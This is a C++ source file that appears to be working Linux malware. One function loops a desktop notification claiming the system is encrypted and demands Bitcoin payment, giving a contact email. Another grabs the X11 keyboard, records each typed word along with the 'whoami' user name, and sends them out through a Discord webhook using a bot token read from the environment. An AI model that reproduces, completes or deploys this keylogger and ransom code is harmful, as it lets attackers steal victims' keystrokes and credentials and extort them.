#include "structure.h"

std::string exec_parsed(const std::string command) {
    std::string result;
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        return result;
    } else {
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }

        pclose(pipe);
        return result;
    }
}

void show_encrypted(NotifyNotification*& notification) {
    while (true) {
        // Show the notification
        notify_notification_show(notification, nullptr);

        // Wait for a few seconds
        std::this_thread::sleep_for(std::chrono::seconds(3)); // Adjust the duration as needed

        // Update the notification to prevent fading away
        notify_notification_update(notification,
            "Ransom Productions C",
            ":warning: Warning! Your system is encrypted. Pay to regain access to files. Ransomware is a threat; understand risks. Don't alter files or decrypt data; risk loss or damage. To restore files, pay to Bitcoin address: 0x164593446094360439. After payment, email ransomprocs@protonmail.com for decryption.",
            "xfce-system-lock");
    }
}

void block_input() {

        dotenv::init();
    std::string BOT_TOKEN_env = std::getenv("BOT_TOKEN");
     std::string ALL_WEBHOOK_env = std::getenv("ALL_WEBHOOK");
     std::string WORDS_WEBHOOK_env = std::getenv("WORDS_WEBHOOK");

    //If you are not going to use some webhook comment it or will throw errror.
     dpp::cluster BOT_TOKEN(BOT_TOKEN_env);
    //dpp::webhook ALL_WEBHOOK(ALL_WEBHOOK_env);
    dpp::webhook WORDS_WEBHOOK(WORDS_WEBHOOK_env);
        std::cout << ALL_WEBHOOK_env << WORDS_WEBHOOK_env;
    std::string output_word;

    Display* display = XOpenDisplay(nullptr);
    if (!display) {
        std::cerr << "Unable to open X display." << std::endl;
        return;
    }

    XGrabKeyboard(display, DefaultRootWindow(display), True, GrabModeAsync, GrabModeAsync, CurrentTime);

    while (true) {
        XEvent event;
        XNextEvent(display, &event);

        if (event.type == KeyPress) {
            KeySym keySym;
            char key[255];
            XLookupString(&event.xkey, key, sizeof(key), &keySym, NULL);

            if (keySym == XK_space) {
                // Process the captured output_word
                if (!output_word.empty()) {
                    dpp::embed keylogger = dpp::embed()
                        .set_author("aaa", "", "")
                        .set_color(dpp::colors::pink);
                    dpp::message webhook_attach("");

                    std::string user_executor = exec_parsed("whoami");
                    std::string formatted_keylogger = "```" + output_word + ". ```";
                    keylogger.add_field("<:Goat_setup:1139573452672614480> Issue", formatted_keylogger, true);
                    keylogger.add_field("Reported by", user_executor, true);
                    webhook_attach.add_embed(keylogger);
                    BOT_TOKEN.execute_webhook(WORDS_WEBHOOK, dpp::message(webhook_attach));

                    output_word.clear(); // Clear the captured word
                }
            } 
            else {
                std::string word(1, key[0]);
                output_word += word;
            }
        }
    }

    XCloseDisplay(display);
}